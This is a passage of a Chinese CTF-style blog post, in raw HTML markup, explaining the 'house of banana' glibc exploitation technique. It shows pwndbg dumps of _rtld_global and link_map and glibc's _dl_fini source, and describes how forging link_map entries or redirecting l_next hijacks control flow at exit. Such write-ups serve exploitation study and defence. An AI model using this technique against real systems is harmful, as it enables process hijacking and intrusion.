class=&#34;number&#34;&gt;4000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;214000&lt;/span&gt; /usr/lib/x86_64-linux-gnu/libc.so&lt;span class=&#34;number&#34;&gt;.6&lt;/span&gt; +&lt;span class=&#34;number&#34;&gt;0x9f8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; x &lt;span class=&#34;number&#34;&gt;0x7ffff7fad9f8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7ffff7fad9f8&lt;/span&gt; &amp;lt;__elf_set___libc_atexit_element__IO_cleanup__&amp;gt;:	&lt;span class=&#34;number&#34;&gt;0xf7e26b10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;house of banana 相较于以往的攻击手法，其实思路很明确。在程序通过显式调用 exit，或者 main 函数是由__libc_start_main 唤起，并可以正常的返回时，由于动态链接的加载机制，程序中并没有 exit 函数的真实调用，而是要通过符号表来获得真实的函数地址。（有关动态链接延迟绑定的技术，还请自行查阅，这里不做过多的阐述。）我们联想到 ret2_dl_resolve 技术。&lt;/p&gt;
&lt;p&gt;下面是 exit 执行的一个过程&lt;/p&gt;
&lt;h5 id=&#34;exit-_dl_fini-fini_t-arrayi&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#exit-_dl_fini-fini_t-arrayi&#34;&gt;#&lt;/a&gt; exit -&amp;gt; _dl_fini -&amp;gt;((fini_t) array[i]) ();&lt;/h5&gt;
&lt;p&gt;​		banana 手法，通过伪造修改相关的表项，以达到调用后门来获得权限。这里我们重点说一下，在 ubuntu3.2 下利用的可行性。大多数师傅对于 banana 的攻击方式主要有两种，一是攻击_rtld_global 这个全局符号所保存的 link_map 的链表。伪造整个链表，进行劫持。相关的全局变量是可以写的。后面会解释这个变量的用处。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/dreamkecat/blog_img//blog_img/image-20220922124833560.png&#34; alt=&#34;image-20220922124833560&#34;&gt;&lt;/p&gt;
&lt;p&gt;另外一个与之相比破坏性比较小，更容易成功。由于 link_map 通过链表链接，但是在加载 exit 的时候，相关函数智慧通过 link_map-&amp;gt;l_next 指针进行相关的检查。我们可以在某个特定的位置，更改 next 指针，将下一以链表节点转为我们控制的地方，比如 heap 上。&lt;/p&gt;
&lt;p&gt;​	很多朋友看了上面的可能会比较蒙，下面我具体说一参数。&lt;/p&gt;
&lt;p&gt;关于 link_map, 我们攻击 exit 时，会使用到一个 link_map 的链表，链表的一些信息保存在 struct rtld_global 结构体中，这个结构体信息很多，很繁杂，但是 banana 只用到了几个关键的点。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p &amp;amp;_rtld_global&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; = (&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; rtld_global *) &lt;span class=&#34;number&#34;&gt;0x7f56e43b9040&lt;/span&gt; &amp;lt;_rtld_global&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//以下是结构体信息的展开，pwndbg为我们做了整理&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p _rtld_global&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _dl_ns = &amp;#123;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      _ns_loaded = &lt;span class=&#34;number&#34;&gt;0x7f56e43ba220&lt;/span&gt;,				&lt;span class=&#34;comment&#34;&gt;//#1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      _ns_nloaded = &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;,						&lt;span class=&#34;comment&#34;&gt;//#2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      _ns_main_searchlist = &lt;span class=&#34;number&#34;&gt;0x7f56e43ba4e0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      _ns_global_scope_alloc = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      _ns_global_scope_pending_adds = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      libc_map = &lt;span class=&#34;number&#34;&gt;0x7f56e4382000&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      _ns_unique_sym_table = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        lock = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          mutex = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            __data = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              __lock = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              __count = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              __owner = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              __nusers = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              __kind = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              __spins = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              __elision = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              __list = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                __prev = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                __next = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            __size = &lt;span class=&#34;string&#34;&gt;&amp;#x27;\000&amp;#x27;&lt;/span&gt; &amp;lt;repeats &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt; times&amp;gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;\001&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;\000&amp;#x27;&lt;/span&gt; &amp;lt;repeats &lt;span class=&#34;number&#34;&gt;22&lt;/span&gt; times&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            __align = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;....    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;//展开数据会很多，但是只是对链表个节点信息的汇总&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;我们需要关注的是，&lt;/p&gt;
&lt;p&gt;​	#1，_ns_loaded = 0x7f56e43ba220,	这是整个链表的头节点，&lt;/p&gt;
&lt;p&gt;​	#2， _ns_nloaded = 4, 这里知名个这个链表的节点个数，在 exit 后面加载的检查中，会要求_ns_nloaded 链表的节点不少于 3 个&lt;/p&gt;
&lt;p&gt;（后面我会给出相关的源码）&lt;/p&gt;
&lt;p&gt;然后对于每个节点，都是 link_map 结构体，我们利用第一个节点做一下简单说明 (省略了部分无关的数据)&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p *(&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; link_map *)&lt;span class=&#34;number&#34;&gt;0x7f56e43ba220&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_addr = &lt;span class=&#34;number&#34;&gt;94172888551424&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_name = &lt;span class=&#34;number&#34;&gt;0x7f56e43ba7c8&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_ld = &lt;span class=&#34;number&#34;&gt;0x55a655922000&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_next = &lt;span class=&#34;number&#34;&gt;0x7f56e43ba7d0&lt;/span&gt;,			&lt;span class=&#34;comment&#34;&gt;//#3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_prev = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,							&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_real = &lt;span class=&#34;number&#34;&gt;0x7f56e43ba220&lt;/span&gt;,			&lt;span class=&#34;comment&#34;&gt;//#3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_ns = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_libname = &lt;span class=&#34;number&#34;&gt;0x7f56e43ba7b0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_info = &amp;#123;&lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a655922010&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a6559220f0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a6559220e0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a655922090&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a6559220a0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a655922120&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a655922130&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a655922140&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a6559220b0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a6559220c0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a655922020&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a655922030&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a655922100&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a6559220d0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a655922110&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a655922160&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a655922040&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a655922060&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a655922050&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a655922070&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a655922000&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a655922150&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a655922180&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a655922170&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a655922160&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a6559221a0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a655922190&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt; &amp;lt;repeats &lt;span class=&#34;number&#34;&gt;25&lt;/span&gt; times&amp;gt;, &lt;span class=&#34;number&#34;&gt;0x55a655922080&lt;/span&gt;&amp;#125;,			&lt;span class=&#34;comment&#34;&gt;//#4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_phdr = &lt;span class=&#34;number&#34;&gt;0x55a65591d040&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;......&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_direct_opencount = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_type = lt_executable,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_relocated = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_init_called = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,					&lt;span class=&#34;comment&#34;&gt;//#5&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_global = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;......&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;我们需要关注的：&lt;/p&gt;
&lt;p&gt;​	#3，l_next = 0x7f56e43ba7d0, ，指向下一个 link_map 的指针，我们就是通过修改这个，将下一个节点劫持为我们伪造的 link_map&lt;/p&gt;
&lt;p&gt;​	#4 , l_real = 0x7f56e43ba220 , 指向的的自身的地址，这里也是后面需要检查的地方。&lt;/p&gt;
&lt;p&gt;​	#5,  l_init_called = 1, 简单说，就是为了绕过检查。&lt;/p&gt;
&lt;p&gt;下面是_dl_fini 函数的源码（我已经删除了部分注释及代码，源码路径为 glibc2.34/elf/dl-fini。c）&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_dl_fini (&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;link_map&lt;/span&gt; *&lt;span class=&#34;title&#34;&gt;maps&lt;/span&gt;[&lt;span class=&#34;title&#34;&gt;nloaded&lt;/span&gt;];&lt;/span&gt;				&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;link_map&lt;/span&gt; *&lt;span class=&#34;title&#34;&gt;l&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  assert (nloaded != &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; || GL(dl_ns)[ns]._ns_loaded == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (l = GL(dl_ns)[ns]._ns_loaded, i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; l != &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;; l = l-&amp;gt;l_next)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	    &lt;span class=&#34;comment&#34;&gt;/* Do not handle ld.so in secondary namespaces.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (l == 